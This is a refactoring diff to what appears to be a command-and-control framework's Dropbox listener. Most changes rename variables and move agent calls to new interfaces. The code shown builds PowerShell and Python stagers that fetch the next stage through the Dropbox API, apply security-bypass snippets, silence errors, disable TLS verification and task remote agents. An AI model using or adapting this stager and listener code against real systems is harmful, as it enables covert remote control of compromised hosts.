@@ -116,11 +116,6 @@ class Listener:
                 "Required": False,
                 "Value": "",
             },
-            "SlackURL": {
-                "Description": "Your Slack Incoming Webhook URL to communicate with your Slack instance.",
-                "Required": False,
-                "Value": "",
-            },
         }
 
         # required:
@@ -165,13 +160,13 @@ class Listener:
         encode=True,
         obfuscate=False,
         obfuscation_command="",
-        userAgent="default",
+        user_agent="default",
         proxy="default",
-        proxyCreds="default",
-        stagerRetries="0",
+        proxy_creds="default",
+        stager_retries="0",
         language=None,
-        safeChecks="",
-        listenerName=None,
+        safe_checks="",
+        listener_name=None,
         bypasses: list[str] | None = None,
     ):
         """
@@ -203,7 +198,7 @@ class Listener:
 
             # replace with stager = '' for troubleshooting
             stager = '$ErrorActionPreference = "SilentlyContinue";'
-            if safeChecks.lower() == "true":
+            if safe_checks.lower() == "true":
                 stager = "If($PSVersionTable.PSVersion.Major -ge 3){"
 
                 for bypass in bypasses:
@@ -212,13 +207,13 @@ class Listener:
 
             stager += "$wc=New-Object System.Net.WebClient;"
 
-            if userAgent.lower() == "default":
+            if user_agent.lower() == "default":
                 profile = listenerOptions["DefaultProfile"]["Value"]
-                userAgent = profile.split("|")[1]
-            stager += f"$u='{ userAgent }';"
+                user_agent = profile.split("|")[1]
+            stager += f"$u='{ user_agent }';"
 
-            if userAgent.lower() != "none" or proxy.lower() != "none":
-                if userAgent.lower() != "none":
+            if user_agent.lower() != "none" or proxy.lower() != "none":
+                if user_agent.lower() != "none":
                     stager += "$wc.Headers.Add('User-Agent',$u);"
 
                 if proxy.lower() != "none":
@@ -233,13 +228,13 @@ class Listener:
                             $wc.Proxy = $proxy;
                         """
 
-                    if proxyCreds.lower() == "default":
+                    if proxy_creds.lower() == "default":
                         stager += "$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;"
 
                     else:
                         # TODO: implement form for other proxy credentials
-                        username = proxyCreds.split(":")[0]
-                        password = proxyCreds.split(":")[1]
+                        username = proxy_creds.split(":")[0]
+                        password = proxy_creds.split(":")[1]
                         domain = username.split("\\")[0]
                         usr = username.split("\\")[1]
                         stager += f"""
@@ -296,20 +291,20 @@ class Listener:
             launcherBase += "import ssl;\nif hasattr(ssl, '_create_unverified_context'):ssl._create_default_https_context = ssl._create_unverified_context;"
 
             try:
-                if safeChecks.lower() == "true":
+                if safe_checks.lower() == "true":
                     launcherBase += listener_util.python_safe_checks()
             except Exception as e:
                 p = f"Error setting LittleSnitch in stager: {e!s}"
                 log.error(p)
 
-            if userAgent.lower() == "default":
+            if user_agent.lower() == "default":
                 profile = listenerOptions["DefaultProfile"]["Value"]
-                userAgent = profile.split("|")[1]
+                user_agent = profile.split("|")[1]
 
             launcherBase += dedent(
                 f"""
                 import urllib.request;
-                UA='{ userAgent }';
+                UA='{ user_agent }';
                 t='{ api_token }';
                 server='https://content.dropboxapi.com/2/files/download';
                 req=urllib.request.Request(server);
@@ -326,13 +321,13 @@ class Listener:
                     proto = proxy.Split(":")[0]
                     launcherBase += f"proxy = urllib.request.ProxyHandler({{'{proto}':'{proxy}'}});\n"
 
-                if proxyCreds != "none":
-                    if proxyCreds == "default":
+                if proxy_creds != "none":
+                    if proxy_creds == "default":
                         launcherBase += "o = urllib.request.build_opener(proxy);\n"
                     else:
                         launcherBase += "proxy_auth_handler = urllib.request.ProxyBasicAuthHandler();\n"
-                        username = proxyCreds.split(":")[0]
-                        password = proxyCreds.split(":")[1]
+                        username = proxy_creds.split(":")[0]
+                        password = proxy_creds.split(":")[1]
                         launcherBase += dedent(
                             f"""
                             proxy_auth_handler.add_password(None,'{ proxy }', '{ username }', '{ password }');
@@ -824,7 +819,7 @@ class Listener:
                             continue
                         stageData = res.content
 
-                        dataResults = self.mainMenu.agents.handle_agent_data(
+                        dataResults = self.mainMenu.agentcommsv2.handle_agent_data(
                             stagingKey, stageData, listenerOptions
                         )
                         if dataResults and len(dataResults) > 0:
@@ -859,16 +854,16 @@ class Listener:
                             continue
                         stageData = res.content
 
-                        dataResults = self.mainMenu.agents.handle_agent_data(
+                        dataResults = self.mainMenu.agentcommsv2.handle_agent_data(
                             stagingKey, stageData, listenerOptions
                         )
                         if dataResults and len(dataResults) > 0:
                             # print "dataResults:",dataResults
                             for language, results in dataResults:
                                 if results.startswith("STAGE2"):
-                                    sessionKey = self.mainMenu.agents.agents[sessionID][
-                                        "sessionKey"
-                                    ]
+                                    sessionKey = self.mainMenu.agentcommsv2.agents[
+                                        sessionID
+                                    ]["sessionKey"]
                                     listenerName = self.options["Name"]["Value"]
                                     message = f"{listenerName}: Sending agent (stage 2) to {sessionID} through Dropbox"
                                     self.instance_log.info(message)
@@ -930,10 +925,11 @@ class Listener:
                                         self.instance_log.error(message, exc_info=True)
 
             # get any taskings applicable for agents linked to this listener
-            sessionIDs = self.mainMenu.agents.get_agents_for_listener(listenerName)
+            with SessionLocal() as db:
+                sessionIDs = self.mainMenu.agentsv2.get_for_listener(db, listenerName)
 
             for sessionID in sessionIDs:
-                taskingData = self.mainMenu.agents.handle_agent_request(
+                taskingData = self.mainMenu.agentcommsv2.handle_agent_request(
                     sessionID, "powershell", stagingKey
                 )
                 if taskingData:
@@ -998,7 +994,7 @@ class Listener:
                     self.instance_log.error(message, exc_info=True)
                     log.error(message, exc_info=True)
 
-                self.mainMenu.agents.handle_agent_data(
+                self.mainMenu.agentcommsv2.handle_agent_data(
                     stagingKey, responseData, listenerOptions
                 )
 
